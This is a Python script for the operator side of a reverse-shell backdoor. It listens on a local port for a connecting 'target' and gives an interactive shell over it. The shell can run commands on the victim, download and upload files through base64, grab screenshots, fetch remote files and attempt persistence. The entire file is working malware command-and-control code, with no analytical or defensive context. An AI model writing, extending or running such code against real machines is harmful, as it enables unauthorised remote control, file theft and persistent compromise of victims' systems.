#!/usr/bin/python
import base64
import socket
import json


def shell():
    while True:
        cmd = input("* Shell#~%s: " % str(ip))
        if cmd == "exit":
            reliable_send("exit")
            print(reliable_recv())
            s.close()
            return
        elif cmd.startswith("help"):
            print('Available functions:'
                  '\n- cd {path} => change host directory'
                  '\n- download {file} => Download a file from host'
                  '\n- upload {file} => Upload a file to the host'
                  '\n- persistence => Try acquiring persistence'
                  '\n- get {url} => Download a remote file')
        elif cmd.startswith("cd") and len(cmd) > 1:
            reliable_send(cmd)
        elif cmd.startswith("download"):
            reliable_send(cmd)
            download(cmd[9:])
        elif cmd.startswith("upload"):
            reliable_send(cmd)
            upload(cmd[7:])
        elif cmd.startswith("screenshot"):
            reliable_send(cmd)
            download("capture.png")
        else:
            reliable_send(cmd)
            print(reliable_recv())


def server():
    global s, target, ip
    # AF_INET=ipv4
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("127.0.0.1", 6666))
    s.listen(5)  # specify the n of connection to accept
    print("Listening to incoming connections...")
    target, ip = s.accept()
    print("Target Connected")


def reliable_send(data):
    json_data = json.dumps(data).encode()
    target.send(json_data)


def reliable_recv():
    json_data = bytearray()
    while True:
        try:
            json_data = json_data + target.recv(1024)
            return json.loads(json_data.decode())
        except ValueError as e:
            print(e)
            continue


def download(filename):
    """
    Download a file from victim host
    :param filename:
    :return:
    """
    try:
        with open(filename, "wb") as file:
            result = reliable_recv()
            # convert result from string to bytes, then decode b64
            result_decoded = base64.b64decode(result.encode())
            file.write(result_decoded)
            file.close()
    except Exception as e:
        print(e)


def upload(filename):
    """
    Upload a file to victim host
    :param filename:
    :return:
    """
    try:
        with open(filename, "rb") as file:
            # read bytes
            b64 = base64.b64encode(file.read())
            # convert to string
            string = b64.decode()
            reliable_send(string)
            print(reliable_recv())
    except Exception as e:
        print(e)


if __name__ == '__main__':
    server()
    shell()
